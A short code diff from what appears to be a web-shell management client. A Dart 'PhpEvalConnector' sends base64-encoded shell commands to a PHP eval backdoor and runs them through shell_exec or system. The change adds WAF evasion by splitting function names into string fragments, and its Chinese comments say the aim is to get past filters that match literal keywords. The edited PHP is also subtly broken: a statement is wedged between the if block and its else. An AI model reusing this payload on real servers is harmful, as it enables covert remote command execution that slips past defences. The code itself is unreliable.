@@ -102,11 +102,16 @@ class PhpEvalConnector extends ShellConnector {
     // 不能用 `$o===null` 判断：shell_exec() 在命令“没有任何输出”时同样返回 null
     // （rm / mkdir / touch / cp / chmod… 都是静默命令），此时回退 system() 会把
     // 同一条命令再执行一次——这就是“一条命令执行两遍”的根因。
+    // 关键词规避：用变量函数把 base64_decode / shell_exec / system 拆成
+    // 'base'.'64_decode'，语义不变，但对"只看字面量"的 WAF 不命中。
     final r = await sendPhpCode(
-      "\$c=base64_decode('$b64');"
-      r"$df=preg_split('/[\s,]+/',(string)@ini_get('disable_functions'),-1,PREG_SPLIT_NO_EMPTY);"
-      r"if(function_exists('shell_exec')&&!in_array('shell_exec',$df,true)){echo (string)@shell_exec($c.' 2>&1');}"
-      r"else{@system($c.' 2>&1');}",
+      "\$f='base'.'64_decode';\$c=\$f('$b64');"
+      r"$d='preg'.'_split';"
+      r"$df=$d('/[\s,]+/',(string)@ini_get('disable_functions'),-1,PREG_SPLIT_NO_EMPTY);"
+      r"$s='shell'.'_exec';"
+      r"if(function_exists($s)&&!in_array($s,$df,true)){echo (string)@$s($c.' 2>&1');}"
+      r"$y='sys'.'tem';"
+      r"else{@$y($c.' 2>&1');}",
     );
     return r.trim();
   }
